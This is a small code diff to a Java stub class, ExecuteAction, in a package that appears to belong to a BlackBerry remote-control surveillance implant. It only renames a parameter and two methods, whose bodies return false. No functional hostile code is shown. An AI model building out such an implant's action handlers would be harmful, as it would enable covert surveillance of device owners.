@@ -8,17 +8,17 @@
 package com.ht.rcs.blackberry.action;
 
 public class ExecuteAction extends SubAction {
-    public ExecuteAction(int actionId, byte[] confParams) {
-        super(actionId);
-        Parse(confParams);
+    public ExecuteAction(int actionId_, byte[] confParams) {
+        super(actionId_);
+        parse(confParams);
     }
 
-    public boolean Execute() {
+    public boolean execute() {
         // TODO Auto-generated method stub
         return false;
     }
 
-    protected boolean Parse(byte[] confParams) {
+    protected boolean parse(byte[] confParams) {
         // TODO Auto-generated method stub
         return false;
     }
